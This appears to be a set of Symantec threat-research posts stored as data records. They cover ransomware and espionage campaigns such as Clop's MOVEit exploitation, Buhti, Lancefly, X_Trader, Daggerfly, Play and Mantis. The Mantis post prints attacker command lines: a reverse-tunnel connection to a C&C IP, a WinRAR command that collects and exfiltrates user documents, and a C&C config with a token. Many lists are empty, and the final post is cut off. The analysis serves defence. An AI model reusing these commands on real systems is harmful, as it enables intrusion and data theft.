    "text": "Extortion actors have been actively exploiting a recently patched vulnerability in MOVEit Transfer, a file-transfer application that is widely used to transmit information between organizations. The nature of the software affected means that attackers can exploit unpatched systems to mount a supply chain attack against multiple organizations. While the original vulnerability (CVE-2023-34362) was patched on May 31, MOVEit Transfer’s developersannounced on Friday (June 9)that multiple additional vulnerabilities (CVEs pending) have also been identified and patched. Prior to its patching, attackers linked to the Clop ransomware operation were already exploiting CVE-2023-34362 as a zero-day vulnerability. Proof-of-concept code for the exploit is now publicly available, meaning other attackers are now likely to attempt to exploit unpatched systems. What is MOVEit Transfer? MOVEit Transfer is a managed file-transfer application developed by Progress Software. It is designed to permit secure transfer of files between businesses and their customers. What is the nature of the vulnerability? The original vulnerability (CVE-2023-34362) occurs in the MOVEit Transfer web application. It affected all versions prior to 2021.0.6 (13.0.6), 2021.1.4 (13.1.4), 2022.0.4 (14.0.4), 2022.1.5 (14.1.5), and 2023.0.1 (15.0.1). “[An] attacker may be able to infer information about the structure and contents of the database in addition to executing SQL statements that alter or delete database elements,” Progress said. For how long was the vulnerability being exploited before it was patched? According to a U. S. government advisory, active exploitation appears to have begun on May 27, 2023. How has the vulnerability been exploited to date? The vulnerability is being actively exploited by the Clop ransomware operation. According toa joint advisory issued by the U. S. Federal Bureau of Investigation (FBI) and the Cybersecurity and Infrastructure Security Agency (CISA), the attackers exploited the vulnerability to install a web shell called Lemurloot (JS. Malscript!g1) on affected systems. This was then used to steal data from underlying databases. Lemurloot was designed specifically to target the MOVEit Transfer platform. It authenticates incoming HTTPS requests via a hard-coded password; runs commands that will download files from the MOVEit Transfer database; extracts its Azure system settings; retrieves records; and can create, insert, or delete a particular user. When responding to a request, Lemurloot returns stolen data in a comfile format. Shortly after the disclosure of the vulnerability, attackers linked to the Clop ransomware operationclaimed responsibility for the attackand said that they had stolen data from multiple MOVEit users and their customers. It threatened to release the stolen data unless a ransom is paid. What is known about Clop? Clop is an extortion and ransomware operation run by a cyber-crime group known as Snakefly (aka TA505, FIN11). While the group initially extorted victims by encrypting files using its own ransomware payload (Ransom. Clop), in recent times it has been known to eschew encryption entirely and rely on the threat of leaking stolen data to extort its victims. The group has a track record in exploiting zero-day vulnerabilities. In 2021, it was linked to theexploitation of multiple vulnerabilities in Accellion FTA, another file-transfer application. Earlier this year it was responsible for exploiting a zero-day vulnerability (CVE-2023-0669) in the GoAnywhere MFT platform. How do Symantec products guard against exploitation of this vulnerability? Symantec products will guard against exploit attempts and payloads with the following detections: Machine learning-based Data Center Security (DCS) default hardening policies such as sym_win_hardened_sbp provide 0-day protection for CVE-2023-34362. DCS policy control \"Software Install Restrictions\" for MS SQL, MS IIS and other hardened application sandboxes stop Clop ransomware from exploiting this vulnerability by preventing arbitrary deployment of webshells and unauthorized software. Observed domains/IPs are covered under security categories. For the latest protection updates, please visit theSymantec Protection Bulletin.

    "text": "A relatively new ransomware operation calling itself Buhti appears to be eschewing developing its own payload and is instead utilizing variants of the leaked LockBit and Babuk ransomware families to attack Windows and Linux systems. While the group doesn’t develop its own ransomware, it does utilize what appears to be one custom-developed tool, an information stealer designed to search for and archive specified file types. Buhti, which first came to public attention in February 2023, was initially reported to be attacking Linux computers. However, Symantec’s Threat Hunter Team has also uncovered attempts to attack Windows computers on compromised networks. The group appears to be quick to exploit recently disclosed vulnerabilities, with one recent attack exploiting the recently patched PaperCut vulnerability. Since Buhti hasn’t been linked to any known cyber-crime group, Symantec has assigned the actor name Blacktail to its operators. A recent Buhti attack saw the attackers attempt to deploy a ransomware payload against Windows computers on the targeted network. Analysis of the payload revealed that it was a minimally modified version of the leaked LockBit 3.0 (aka LockBit Black) ransomware. Encrypted files are appended with a .buthi extension. The ransom note can be seen in Figure 1. The ransomware includes a feature that drops a LockBit-branded .bmp file (Figure 2) and makes it the Windows wallpaper, but this functionality was disabled by the attackers. The ransomware also has the capability to send system information about the infected computer to a command-and-control (C&C) server, but this functionality is also disabled and no C&C server is specified. LockBit 3.0 was developed for the Syrphid cyber-crime group (aka Bitwise Spider), which is the operator of the LockBit ransomware. The builder for the ransomwarewas leaked in September 2022, allegedly by a disgruntled developer. While Buhti came to public attention for targeting Linux machines with a payload written in Golang, analysis by Symantec of multiple Linux payloads found that they were all variants of the leaked Babuk ransomware. Babuk was one of the first ransomware actors to target ESXi systems with a Linux payload. Babuk’s source code was leaked in 2021 and since then has been adopted and reused by multiple ransomware operations. The ransom note dropped by Linux variants was identical to that of the Windows payload; with only the payment address differing. Blacktail does appear to use at least one piece of custom malware, a data-exfiltration tool (SHA256: 9f0c35cc7aab2984d88490afdb515418306146ca72f49edbfbd85244e63cfabd). Written in Golang, it is designed to steal the following file types: .pdf, .php, .png, .ppt, .psd, .rar, .raw, .rtf, .sql, .svg, .swf, .tar, .txt, .wav, .wma, .wmv, .xls, .xml, .yml, .zip, .aiff, .aspx, .docx, .epub, .json, .mpeg, .pptx, .xlsx, .yaml. Copied files are placed into a .zip archive, which is created usingan open source utility called zip. The tool can be configured via command-line arguments to specify both the directory to search for files of interest in and the name of the output archive. The -o argument in the command line specifies the archive to be created. The -d argument specifies the directory to search for files of interest in. For example: CSIDL_WINDOWS\\temp\\xhfw.exe -o CSIDL_WINDOWS\\temp\\output.zip -d CSIDL_PROFILE Recent Buhti attacks exploited a recently discovered vulnerability in PaperCut NG and MF (CVE-2023-27350). The exploit allows an attacker to bypass authentication and remotely execute code. The vulnerability was disclosed and patched by PaperCut on March 15, 2023, and in recent weeks multiple threat actors have begun utilizing the exploit against unpatched systems. The attackers exploited the vulnerability in order to install Cobalt Strike, Meterpreter, Sliver, AnyDesk, and ConnectWise. The tools were leveraged to steal data from, and deliver the ransomware payload to, multiple computers on the targeted network. Blacktail appears quick to utilise new exploits. In February,they were reportedto be exploiting a vulnerability in IBM’s Aspera Faspex file-exchange application (CVE-2022-47986). While the reuse of leaked payloads is often the hallmark of a less-skilled ransomware operation, Blacktail’s general competence in carrying out attacks, coupled with its ability to recognize the utility of newly discovered vulnerabilities, suggests that it is not to be underestimated.

    "text": "The Lancefly advanced persistent threat (APT) group is using a custom-written backdoor in attacks targeting organizations in South and Southeast Asia, in activity that has been ongoing for several years. Lancefly may have some links to previously known groups, but these are low confidence, which led researchers at Symantec, byBroadcom Software, to classify this activity under a new group name. Lancefly’s custom malware, which we have dubbed Merdoor, is a powerful backdoor that appears to have existed since 2018. Symantec researchers observed it being used in some activity in 2020 and 2021, as well as this more recent campaign, which continued into the first quarter of 2023. The motivation behind both these campaigns is believed to be intelligence gathering. The backdoor is used very selectively, appearing on just a handful of networks and a small number of machines over the years, with its use appearing to be highly targeted. The attackers in this campaign also have access to an updated version of the ZXShell rootkit. The targets in this most recent activity, which began in mid-2022 and continued into 2023, are based in South and Southeast Asia, in sectors including government, aviation, education, and telecoms. Symantec researchers previously saw the Merdoor backdoor used in activity that targeted victims in the same geographies in the government, communications, and technology sectors in 2020 into 2021. Like this recent activity, that activity also appeared to be highly targeted, with only a small number of machines infected. Merdoor is a fully-featured backdoor that appears to have been in existence since 2018. The backdoor contains the following functionality: Instances of the Merdoor backdoor are usually identical with the exception of embedded and encrypted configuration, which determines: Typically, the backdoor is injected into the legitimate processes perfhost.exe or svchost.exe. The Merdoor dropper is a self-extracting RAR (SFX) that contains three files: When opened, the dropper extracts embedded files and executes a legitimate binary in order to load the Merdoor loader. Merdoor dropper variants have been found that abuse older versions of five different legitimate applications for the purpose of DLL sideloading: Evidence from Lancefly’s earlier campaign that began in 2020 suggested that in that instance the group may have used a phishing email with a lure based on the 37th ASEAN Summit as an initial infection vector. In this more recent activity, the initial infection vector was not entirely clear. We saw some indications of what the initial infection vector may have been in two victims, though this was not conclusive. While evidence for any of these infection vectors is not definitive, it does appear to indicate that Lancefly is adaptable when it comes to the kind of infection vectors it uses. Credential theft using non-malware techniques In activity that also aligned with their earlier campaign in 2020/2021, the attackers used a number of non-malware techniques for credential theft on victim machines: The attackers also used a masqueraded version of the legitimate archiving tool WinRAR to stage and encrypt files before exfiltration. Notable attack chain tools and TTPs A typical Merdoor attack chain, as seen in one of the victims, appears to be: The ZXShell rootkit wasfirst reported on by Cisco in 2014, but the version of the tool used by Lancefly is updated, indicating that it continues to be actively developed. The source code of this rootkit is publicly available so it may be used by multiple different groups. The new version of the rootkit used by Lancefly appears to be smaller in size, while it also has additional functions and targets additional antivirus software to disable. The loader for the rootkit is a 32-bit DLL with the export directory name \"FormDll.dll\" (SHA256: 1f09d177c99d429ae440393ac9835183d6fd1f1af596089cc01b68021e2e29a7). It has the following exports: Whenever the export \"LoadSys\" is executed, it drops one of the following files based on the processor architecture: These files are a malicious Windows Kernel driver. This is a variant of a driver that wasfirst documented in an RSAblog several years ago. It has the PDB filename: \"c:\\google\\objchk_win7_amd64\\amd64\\Google.pdb\" The sample creates the device: \"\\Device\\TdiProxy0\". It also creates the symbolic link \"\\DosDevices\\TdiProxy0\", so that it can be controlled using the pathname “\\\\.\\TdiProxy0”. After this, the loader timestamps the dropped file by copying the timestamps from the file \"[WindowsDirectory]\\system32\\drivers\\http.sys\". Then it creates a service with the following parameters: \"CallDriver\" opens the following device, which was created by the“\\\\.\\TdiProxy0”malicious kernel driver. It communicates with it using theDeviceIoControlAPI. The export expects two arguments. The first argument determines the dwIoControlCode parameter to use when calling theDeviceIoControlAPI and it should be one of the following strings: Any other values result in what looks like a buggy dwIoControlCode value. The second argument is a string to pass as an lpInBuffer parameter when calling theDeviceIoControlAPI, after conversion using theMultiByteToWideCharAPI. Whenever the export \"DoRVA\" is executed, it reads the following file: The file should start with the magic string \"AP32\" and contains shellcode to execute in compressed form. Export \"KillAvpProcess\" This enumerates running processes and for selected processes and calls its own export \"CallDriver\" with the following parameters: The export expects a single string parameter to compare with the executable file of running processes for selection. Export \"ProtectDllFile\" This calls its own export \"CallDriver\" with the following parameters: Next, it sets the following registry value: This is a 32-bit executable with the PDB filename: \"M:\\Project\\database\\10.0.18362\\Form\\Release\\Form.pdb\". (SHA256: 180970fce4a226de05df6d22339dd4ae03dfd5e451dcf2d464b663e86c824b8e) Whenever the sample is executed, it loads the following DLL: It also calls its export: \"DoRVA\". Installation and Update Utility The installation and update utility is a 32-bit PE executable (SHA256: a6020794bd6749e0765966cd65ca6d5511581f47cc2b38e41cb1e7fddaa0b221) that shares small but distinctive fragments of code with the Merdoor loader, which is what indicates they are part of the same toolset. Whenever the sample is executed, it attempts to read and delete the following file containing its configuration data: Next, it checks that: If both checks pass, the sample attempts to tamper with various antivirus products using the \"\\\\.\\TdiProxy0\" device. For example, it may terminate the processes \"egui.exe\", \"ekrn.exe\", and \"msmpeng.exe\". Next, it attempts to rename the file \"[FILE_DIRECTORY_OF_RUNNING_EXECUTABLE]\\res.dat\" as one of the following (depending on the Windows version): Based on the structure of the code, the above file should start with the magic string \"AP32\" and could contain a DLL file in compressed form. The sample then decompresses the renamed file \"temp.temp\". When decompressing, it may create the temporary file \"temp.temp.pack\" in the same folder. Next, the sample appends a certain marker followed by the content of \"[FILE_DIRECTORY_OF_RUNNING_EXECUTABLE]\\res.ini\" (partially transformed using the XOR algorithm with the byte key 0x12) at the end of the decompressed file. Additionally, it also creates the following registry value: Then the sample checks if the following file exists: If so, the sample renames the updated \"temp.temp\" file to replace it. Otherwise, it checks the following registry value for the pathname to replace: If that fails, it uses a default from configuration data. Finally, it checks the following registry value for a service name: It restarts the referred service. Installation functionality The sample attempts to decompress the following file: Then it may modify one of the following registry values to hijack the corresponding service: Next, it starts the corresponding service and then removes the registry value. It then attempts to tamper with various antivirus products using the \"\\\\.\\TdiProxy0\" device. It then creates a service with the following parameters: Then it creates the following registry value: It then deletes the following registry values: Next, it renames the following file: Based on the structure of the code, the above file should start with the magic string \"AP32\" and could contain a DLL file in compressed form (using aPLib for compression). The sample then decompresses the renamed \"[PER CONFIGURATION DATA].back\" as \"[PER CONFIGURATION DATA]\". Next, the sample appends a certain marker followed by the content of \"[FILE_DIRECTORY_OF_RUNNING_EXECUTABLE]\\res.ini\" (partially transformed using the XOR algorithm with the byte key 0x12) at the end of the decompressed file. Additionally, it also creates the following registry value: Finally, when the configuration data includes the option \"OneSelfKey\", it makes a compressed copy of its own executable as (using aPLib for compression): Some samples include an embedded archive with the final payload: This is a variant of the ZXShell backdoor (SHA256: d5df686bb202279ab56295252650b2c7c24f350d1a87a8a699f6034a8c0dd849). The ZXShell rootkit used by Lancefly is signed by the certificate \"Wemade Entertainment Co. Ltd\", which was previously reported to be associated with APT41 (aka Blackfly/Grayfly). However, it is known that Chinese APT groups, such as APT41,often share certificateswith other APT groups. The ZXShell backdoor has also previously been used by the HiddenLynx/APT17 group, but as the source code of ZXShell is now publicly available this does not provide a definitive link between these two groups. Also notable is that the ZXShell rootkit loader component has the name \"formdll.dll\" and it has the ability to read the file \"Form.hlp\" and execute its contents as shellcode. Those same files were mentioned as being used in a previous reportdetailing activity by the Iron Tiger (aka Budworm/APT27) group. In that case, the attackers used these filenames when loading the PlugX backdoor onto victim machines. The prevalence of such files is very low, which may indicate a potential link between that campaign and this more recent activity. PlugX is also seen being used by Lancefly. PlugX is a remote access Trojan (RAT) with multiple functionalities including backdoor access and data exfiltration. PlugX has existed for well over a decade. It was originally used by Chinese APT groups, but its use is now very widespread, meaning it is difficult to use it as a way of attributing activity. ShadowPad is also used by these attackers. ShadowPad is a modular RAT believed to be exclusively used by Chinese APT groups. Its capabilities are similar to PlugX, and it is often referred to as a successor to that malware. While these overlaps and shared tools may indicate some links between Lancefly activity and activity by other APT groups, none of the overlaps are strong enough to attribute this activity and the development of the Merdoor backdoor to an already-known attack group. This recent Lancefly activity is of note due to its use of the Merdoor backdoor, but also the low prevalence of this backdoor and the seemingly highly targeted nature of these attacks. While the Merdoor backdoor appears to have been in existence for several years, it appears to only have been used in a small number of attacks in that time period. This prudent use of the tool may indicate a desire by Lancefly to keep its activity under the radar. The tools used and sectors targeted all point to the motivations of this attack campaign being intelligence gathering. The similarities between this recent activity and earlier activity by Lancefly indicate that the group perhaps did not realize the earlier activity had been discovered, so it was not concerned about links being made between the two. Whether or not the exposure of this activity will lead to any alteration in how the group carries out its activity remains to be seen.

    "text": "The X_Trader software supply chain attack affected more organizations than 3CX. Initial investigation by Symantec’s Threat Hunter Team has, to date, found that among the victims are two critical infrastructure organizations in the energy sector, one in the U. S. and the other in Europe. In addition to this, two other organizations involved in financial trading were also breached. As reported yesterday by Mandiant, Trojanized X_Trader software was the cause of the 3CX breach, which was uncovered last month. As a result of this breach,3CX’s software was compromised, with many customers inadvertently downloading malicious versions of the company’s voice and video calling software DesktopApp. In addition to wider victims, Symantec has also discovered additional indicators of compromise, listed below. It appears likely that the X_Trader supply chain attack is financially motivated, since Trading Technologies, the developer of X_Trader, facilitates futures trading, including energy futures. Nevertheless, the compromise of critical infrastructure targets is a source of concern. North Korean-sponsored actors are known to engage in both espionage and financially motivated attacks and it cannot be ruled out that strategically important organizations breached during a financial campaign are targeted for further exploitation. The infection chain starts with the Trojanized installer named X_TRADER_r7.17.90p608.exe (SHA256: 900b63ff9b06e0890bf642bdfcbfcc6ab7887c7a3c057c8e3fd6fba5ffc8e5d6), which is digitally signed by \"Trading Technologies International, Inc.\" and contains a malicious executable named Setup.exe. Our analysis of one version of this executable (SHA256: aa318070ad1bf90ed459ac34dc5254acc178baff3202d2ea7f49aaf5a055dd43) found that when executed, it examined the file named X_TRADER-ja.mst (also contained in the installer) for the following marker bytes at hardcoded offset 0x167000: If the marker bytes are present, it creates a folder named: It then copies the file C:\\Windows\\Sysnative\\immersivetpmvscmgrsvr.exe as C:\\Programdata\\TPM\\TpmVscMgrSvr.exe to the new folder. Next, it will drop two malicious DLLs: The content of the dropped files is generated by decrypting chunks of the file X_TRADER-ja.mst mentioned earlier using the XOR algorithm with the following key: To achieve persistence on the victim’s system, the malware invokes a CLSID_TaskScheduler COM object, possibly to create a scheduled task to run periodically the following file: Setup.exe then drops a file named X_TRADER.exe, also contained within the installer. The content of the dropped file is generated by decrypting chunks from one of its own portable executable resources starting at hardcoded offset 0x1CB40 using the XOR algorithm with the following key: Setup will then execute X_Trader.exe before deleting itself. Once installed, the legitimate X_Trader executable side-loads the two malicious DLLs dropped by the installer. The first, winscard.dll, acts as a loader and contains code that will load and execute a payload from the second (msvcr100.dll). The msvcr100.dll file contains an encrypted blob appended to the file. The blob starts with the hex value FEEDFACE, which the loader uses to find the blob. The process for payload installation is almost identical as that seen with the Trojanized 3CX app, where two side-loaded DLLs are used to extract a payload from an encrypted blob. In this attack, the payload extracted is a modular backdoor called Veiledsignal (SHA256: e185c99b3d1085aed9fda65a9774abd73ecf1229f14591606c6c59e9660c4345). Veiledsignal contains another DLL (SHA256: 19442d9e476e3ef990ce57b683190301e946ccb28fc88b69ab53a93bf84464ae), which is a process-injection module. This can be injected into the Chrome, Firefox, or Edge web browsers. The module contains a second DLL (SHA256: f8c370c67ffb3a88107c9022b17382b5465c4af3dd453e50e4a0bd3ae9b012ce), which is a command-and-control (C&C) module. It connects to the following C&C URL: The discovery that 3CX was breached by another, earlier supply chain attack made it highly likely that further organizations would be impacted by this campaign, which now transpires to be far more wide-ranging than originally believed. The attackers behind these breaches clearly have a successful template for software supply chain attacks and further, similar attacks cannot be ruled out.

    "text": "A telecommunications organization in Africa appears to be among the latest targets for the Daggerfly (aka Evasive Panda, Bronze Highland) advanced persistent threat (APT) group, with the group’s most recent campaign using previously unseen plugins from the MgBot malware framework. The first indications of malicious activity on this victim’s network were seen in November 2022, but there are indications the activity is likely still ongoing. Researchers from the Threat Hunter Team at Symantec, byBroadcom Software, found multiple unique plugins associated with the MgBot modular malware framework on the victim’s network. The attackers were also seen using a PlugX loader and abusing the legitimate AnyDesk remote desktop software. Use of the MgBot modular malware framework and PlugX loader have been associated in the past with China-linked APTs. Association between this activity and Daggerfly is based in part on detailsin a 2020 blog about activity that Malwarebytes attributed to Evasive Panda. Crossovers in the activity included: The folders and file names used in this recent activity, as well as the use of DLL side-loading, also support the attribution. The activity documented by Malwarebytes occurred in 2020, and Daggerfly is believed to have been active since at least 2014. Suspicious AnyDesk connections spotted on a Microsoft Exchange mail server in November 2022 were among the first signs of suspicious activity on the victim network targeted in this recent Daggerfly activity. AnyDesk is a legitimate remote desktop software but it is commonly abused by threat actors for remote access and other purposes. The WannaMine crypto-mining malware was also seen on the same Exchange server, though it appears likely that this activity was not linked to the Daggerfly group. The presence of WannaMine, however, does indicate that the server it was found on may have been unpatched and vulnerable to the EternalBlue exploit, as well as more recent exploits targeting this web server. The legitimate, free Rising antivirus software was also used to side-load the PlugX loader onto victim machines. We will go through the attack chain in further detail below. Threat actors used the living-off-the-land tools BITSAdmin and PowerShell to download files onto victim systems. The attackers downloaded the legitimate AnyDesk executable and the GetCredManCreds tool in this way. The attackers used the previously downloaded GetCredManCreds script to retrieve the usernames and passwords of web services stored in the credential manager using PowerShell. They also dumped the SAM (Security Account Manager), System, and Security hives of the Windows registry using the reg.exe tool. This allowed the adversaries to extract credentials from the SAM database. Persistence with local account Daggerfly also created a local account to maintain access to victim systems with the following command line: MgBot modular malware framework MgBot is a well-designed modular framework that is actively maintained. The components of the framework are the following: The MgBot plugins that were deployed in this activity have numerous capabilities that can provide the attackers with a significant amount of information about compromised machines. Among the unique plugins that were deployed during this activity were: All of these capabilities would have allowed the attackers to collect a significant amount of information from victim machines. The capabilities of these plugins also show that the main goal of the attackers during this campaign was information-gathering. Daggerfly’s development of these previously unseen plugins demonstrates that the attack group is continuing to actively develop its malware and the tools it can use to target victim networks. Telecoms companies will always be a key target in intelligence gathering campaigns due to the access they can potentially provide to the communications of end-users. Symantec’s Threat Hunter team also spotted some other recent activity targeting telecoms companies that was linked with moderate confidence to the threat actor Othorene (aka Gallium), in what appeared to be a continuation of an intelligence-gathering campaign first reported on bySentinelOne under the name Operation Tainted Love in March. SentinelOne reported that in that campaign Othorene was targeting telecoms companies in the Middle East. Othorene has been active since around 2014, and it is believed to be a relatively small group that has a strong focus on the surveillance of individuals. There are some indications that Othorene may have links with the APT41 (aka Blackfly, Grayfly) APT group also. Overlap of both personnel and tactics, techniques, and procedures (TTPs) among Chinese APT groups is not uncommon, and can mean that attributing activity to one group with high confidence is difficult. In the activity Symantec saw, we found three additional victims of the same campaign that SentinelOne detailed, located in Asia and Africa. Two of the three were subsidiaries of the same Middle Eastern telecoms firm. The attackers had been active on victim networks since November 2022. Symantec saw attackers dumping credentials and scanning the network using NbtScan. The main malware (pc.exe dubbed mim221) in this campaign was used to dump credentials, and it had the same password as the malware used in the activity documented by SentinelOne. The attackers also moved laterally across victims’ networks, used Scheduled Task for persistence, and dumped SAM and System hives from the registry.

    "text": "The Play ransomware group is using two new, custom-developed tools that allow it to enumerate all users and computers on a compromised network, and copy files from the Volume Shadow Copy Service (VSS) that are normally locked by the operating system. The first tool found by researchers at Symantec, byBroadcom Software,was Grixba (Infostealer. Grixba), which is a network-scanning tool used to enumerate all users and computers in the domain. The threat actors use the . NET infostealer to enumerate software and services via WMI, WinRM, Remote Registry, and Remote Services. The malware checks for the existence of security and backup software, as well as remote administration tools and other programs, saving the gathered information in CSV files that are compressed into a ZIP file for subsequent manual exfiltration by the threat actors. The Play ransomware gang developed Grixba usingCostura, a popular. NET development tool for embedding an application's dependencies into a single executable file. This eliminates the requirement for the program and its dependencies to be deployed separately, making it easier to share and deploy the application. Costura embeds into applications the DLL file costura.commandline.dll, which is used by Grixba to parse command lines. An analysis of a Grixba sample by Symantec revealed the following help message and functionality: The Scanall mode enumerates software and services via WMI, WinRM, Remote Registry, and Remote Services. It then checks for the existence of the following security programs: It also checks for the existence of the following backup software: It then checks for the existence of the following remote administration tools: Finally, it checks for the presence any of the following programs: The malware then saves all the information in CSV files and, using WinRAR, compresses them to a file named export.zip. List of CSV files compressed by Grixba: Scan mode is similar to Scanall mode, but scans for a subset of the programs covered by Scanall mode. Clr mode deletes the logs from local and remote computers. It also enumerates the following registry keys: SYSTEM\\\\CurrentControlSet\\\\services\\\\eventlog SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\WINEVT\\\\Channels It uses the APIs \"EvtOpenLog\" and \"EvtClearLog\" to delete the logs and deletes the WMI activity logs from the event source \"Microsoft-Windows-WMI-Activity\". The Play ransomware gang was also recently observed using another . NET executable, which was also developed with the Costura tool. Costura embeds the libraryAlphaVSSinto executables. The AlphaVSS library is a. NET framework that provides a high-level interface for interacting with VSS. The library makes it easier for . NET programs to interface with VSS by offering a set of controlled APIs. Developers can use these APIs to generate, manage, and delete shadow copies, as well as access information about existing shadow copies such as size and status. The tool created by the Play ransomware operators uses AlphaVSS to copy files from VSS snapshots. The tool enumerates the files and folders in a VSS snapshot and copies them to a destination directory. The tool allows the attackers to copy files from VSS volumes on compromised machines prior to encryption. This allows the threat actors to copy files that would normally be locked by the operating system. Play ransomware (also known as PlayCrypt), which is developed by a group Symantec tracks as Balloonfly, was launched in June 2022, and since then has been responsible for multiple high-profile attacks. Like most ransomware groups now, Play carries out double-extortion attacks, where the attackers exfiltrate data from victim networks before encrypting them. While the ransomware gang had an initial focus on organizations in Latin America, especially Brazil, it soon widened its targeting. Play is known for targeting Microsoft Exchange vulnerabilities (CVE-2022-41080,CVE-2022-41082), as well as other flaws, to gain remote code execution (RCE) and infiltrate victim networks. The group was also one of the first ransomware groups to employintermittent encryption, a technique that allows for faster encryption of victims’ systems. The tactic consists of encrypting only parts of the targeted files' content, which would still render the data unrecoverable. Play is also notable as it doesn’t appear to operate as a ransomware-as-a-service, with Balloonfly seemingly carrying out the ransomware attacks as well as developing the malware. Custom tools are increasingly being used by ransomware gangs in their attacks. This is likely due to a number of reasons, such as making attacks more efficient and reducing dwell time. Custom tools can be tailored to a specific target environment, allowing ransomware gangs to carry out attacks faster and more efficiently. The use of proprietary tools also gives ransomware operators more control over their operations. If a tool is widely available, it can be reverse-engineered or adapted by other attackers, potentially weakening the initial attack's effectiveness. By keeping their tools proprietary and exclusive, ransomware gangs can maintain their competitive advantage and maximize their profits.

    "text": "The Mantis cyber-espionage group (aka Arid Viper, Desert Falcon, APT-C-23), a threat actor believed to be operating out of the Palestinian territories,is continuing to mount attacks, deploying a refreshed toolset and going to great lengths to maintain a persistent presence on targeted networks. While the group is known for targeting organizations in the Middle East, the most recent campaign uncovered by Symantec, byBroadcom Software, focused on organizations within the Palestinian territories, with malicious activity beginning in September 2022 and continuing to at least February 2023. This targeting is not unprecedented for Mantis and Symantec previously uncovered attacks against individuals located in the Palestinian territories during 2017. Mantis has been active since at least 2014, with some third-party reporting suggesting it may have been active as early as 2011. The group is known to target organizations in Israel and a number of other Middle Eastern countries. Sectors targeted include government, military, financial, media, education, energy, and think tanks. The group is known for employing spear-phishing emails and fake social media profiles to lure targets into installing malware on their devices. Mantis is widely accepted to be linked to the Palestinian territories. Whileother vendors have linked the group to Hamas, Symantec cannot make a definitive attribution to any Palestinian organization. In its most recent attacks, the group used updated versions of its custom Micropsia and Arid Gopher backdoors to compromise targets before engaging in extensive credential theft and exfiltration of stolen data. The initial infection vector for this campaign remains unknown. In one organization targeted, a feature of the compromise was that the attackers deployed three distinct versions of the same toolset (i.e. different variants of the same tools) on three groups of computers. Compartmentalizing the attack in this fashion was likely a precautionary measure. If one toolset was discovered, the attackers would still have a persistent presence on the target’s network. The following is a description of how one of those three toolsets was used: The first evidence of malicious activity occurred on December 18, 2022. Three distinct sets of obfuscated PowerShell commands were executed to load a Base64-encoded string, which started embedded shellcode. The shellcode was a 32-bit stager that downloaded another stage using basic TCP-based protocol from a command-and-control (C&C) server: 104.194.222[.]50 port 4444. The attackers returned on December 19 to dump credentials before downloading the Micropsia backdoor and Putty,a publicly available SSH client, using Certutil and BITSAdmin Micropsia subsequently executed and initiated contact with a C&C server. On the same day, Micropsia also executed on three other machines in the same organization. In each case, it ran in a folder named after its file name: On one computer, Micropsia was used to set up a reverse socks tunnel to an external IP address: CSIDL_COMMON_APPDATA\\windowsservicemanageav\\windowsservicemanageav.exe -connect 104.194.222[.]50:443 [REDACTED] On December 20, Micropsia was used to run an unknown executable named windowspackages.exe on one of the infected computers. The following day, December 21, RAR was executed to archive files on another infected computer. Between December 22 and January 2, 2023, Micropsia was used to execute the Arid Gopher backdoor on three infected computers. Arid Gopher was in turn used to run a tool called SetRegRunKey.exe that provided persistence by adding Arid Gopher to the registry so that it executed on reboot. It also ran an unknown file named localsecuritypolicy.exe (this file name was used for the Arid Gopher backdoor elsewhere by the attackers). On December 28, Micropsia was used to run windowspackages.exe on three more infected computers. On December 31, Arid Gopher executed two unknown files named networkswitcherdatamodell.exe and networkuefidiagsbootserver.exe on two of the infected computers. On January 2, the attackers retired the version of Arid Gopher they were using and introduced a new variant. Whether this was because the first version was discovered or whether it was standard operating procedure is unclear. On January 4, Micropsia was used to execute two unknown files, both named hostupbroker.exe, on a single computer from the folder: csidl_common_appdata\\hostupbroker\\hostupbroker.exe. This was immediately followed by the exfiltration of a RAR file: CSIDL_COMMON_APPDATA\\windowsupserv\\windowsupserv.exe -f CSIDL_COMMON_APPDATA\\windowspackages\\01-04-2023-15-13-39_getf.rar On January 9, Arid Gopher was used to execute two unknown files on a single computer: The last malicious activity occurred from January 12 onwards when Arid Gopher was used to execute the unknown file named localsecuritypolicy.exe every ten hours. Variants of the Micropsia backdoor used in these attacks appear to be slightly updated versions of those seen by other vendors. In this campaign, Micropsia was deployed using multiple file names and file paths: Micropsia is executed using WMI and its main purpose appears to be running secondary payloads for the attackers. These included: In addition to this, Micropsia has its own functionality, such as taking screenshots, keylogging, and archiving certain file types using WinRAR in preparation for data exfiltration: \"%PROGRAMDATA%\\Software Distributions\\WinRAR\\Rar.exe\" a -r -ep1 -v2500k -hp71012f4c6bdeeb73ae2e2196aa00bf59_d01247a1eaf1c24ffbc851e883e67f9b -ta2023-01-14 \"%PROGRAMDATA%\\Software Distributions\\Bdl\\LMth__C_2023-02-13 17-14-41\" \"%USERPROFILE%\\*.xls\" \"%USERPROFILE%\\*.xlsx\" \"%USERPROFILE%\\*.doc\" \"%USERPROFILE%\\*.docx\" \"%USERPROFILE%\\*.csv\" \"%USERPROFILE%\\*.pdf\" \"%USERPROFILE%\\*.ppt\" \"%USERPROFILE%\\*.pptx\" \"%USERPROFILE%\\*.odt\" \"%USERPROFILE%\\*.mdb\" \"%USERPROFILE%\\*.accdb\" \"%USERPROFILE%\\*.accde\" \"%USERPROFILE%\\*.txt\" \"%USERPROFILE%\\*.rtf\" \"%USERPROFILE%\\*.vcf\" Unlike Micropsia, which is written in Delphi, Arid Gopher is written in Go. Versions of Arid Gopher used in this campaign contain the following embedded components: Arid Gopher was also used to launch the following unknown files: networkswitcherdatamodell.exe, localsecuritypolicy.exe, and networkuefidiagsbootserver.exe, in addition to being used to download and execute files obfuscated with PyArmor. When communicating with a C&C server, Arid Gopher registers a device on one path then connects to another path, likely to receive commands: Arid Gopher appears to be regularly updated and rewritten by the attackers, most likely in order to evade detection. One variant of the malware was radically different from previous versions seen with most of the distinctive code updated, so much so that there was not a single subroutine that contained identical distinctive code when compared with the previous version. Mantis appeared to be aggressively mutating the logic between variants, which is a time-intensive operation if done manually. The embedded setup.env file used by one analyzed variant of Arid Gopher to retrieve configuration data contained the following: DIR=WindowsPerceptionService ENDPOINT=http://jumpstartmail[.]com/IURTIER3BNV4ER BW_TOO_ID=7463b9da-7606-11ed-a1eb-0242ac120002 SERVER_TOKEN=PDqMKZ91l2XDmDELOrKB STAPP=AttestationWmiProvider.exe SHORT_APP=ServiceHubIdentityHost.exe The setup.env configuration file mentions another file, AttestationWmiProvider.exe, which is also embedded in Arid Gopher. The file is a 32-bit executable that is used as a helper to ensure that another executable will run on reboot. When it executes, it checks for the following command-line arguments: \"key\" with string parameter [RUN_VALUE_NAME] \"value\" with string 